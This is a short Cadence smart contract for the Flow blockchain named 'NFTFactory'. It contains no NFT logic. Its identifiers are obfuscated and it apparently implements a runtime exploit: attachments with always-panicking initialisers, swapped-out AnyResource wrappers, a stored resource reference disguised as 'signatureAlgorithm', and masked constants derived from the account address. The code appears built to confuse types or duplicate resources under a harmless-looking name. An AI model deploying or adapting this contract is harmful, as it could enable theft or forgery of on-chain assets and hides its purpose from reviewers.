access(all) contract NFTFactory {

    access(self) var a18: UInt
    access(all) var a6: UInt
    access(self) let my_values: {UInt: UInt}

    access(all) attachment a5 for AnyStruct {
        access(all) var a10: a4

        access(all) fun a19(refSelf: &a5): a4 {
            var a36 = a4()
            refSelf.a10 <-> a36
            return a36
        }

        init() {
            self.a10 = a4()
            panic("0")
        }
    }

    access(all) struct a4 {
        access(all) var a26: [PublicKey]

        init() {
            self.a26 = []
        }
    }

    access(all) struct a0 {}

    access(all) resource a2 {
        access(all) var a21: @[AnyResource]

        access(all) fun a19(): @AnyResource {
            return <- self.a21.removeFirst()
        }

        init(a21: @AnyResource) {
            self.a21 <- [<- a21]
        }
    }

    access(all) resource a3 {
        access(all) var rawValue: @a2

        access(all) fun a19(): @a2 {
            var a35 <- create a2(a21: <- [])
            self.rawValue <-> a35
            return <- a35
        }

        init(a15: @a2) {
            self.rawValue <- a15
        }
    }

    access(all) fun a22(a21: @AnyResource): @a2 {
        return <- create a2(a21: <- a21)
    }

    access(all) fun a23(a15: @a2): @a3 {
        return <- create a3(a15: <- a15)
    }

    access(all) attachment a1 for AnyStruct {
        access(all) var signatureAlgorithm: &a3

        access(all) fun a31(refSelf: &a1, ref: &a3) {
            refSelf.signatureAlgorithm = ref
        }

        init(ref: &a3) {
            self.signatureAlgorithm = ref
            panic("1")
        }
    }

    access(all) fun a37(): StoragePath {
        return StoragePath(identifier: "nftpool")!
    }

    access(self) fun a11(): UInt {
        let a43: UInt = 0x13e7a630506419d5
        let a20 = (((self.a6 ^ a43 ^ 0xffffffffffffffff) + 1) >> 64)
        return self.my_values[a20]!
    }

    access(self) fun a38() {
        self.a18 = self.a11()
    }

    init() {
        self.a18 = 0
        self.my_values = {
            1: 0xab8d79837ca9e79c,
            2: 0x54a47930f6cb3dc4,
            3: 0x8a6c0dbd3aef1bff
        }
        self.a6 = (UInt.fromBigEndianBytes(self.account.address.toBytes())! * 0x2dc7e1f786ac4e01) & 0xffffffffffffffff
        NFTFactory.a38()
    }
}
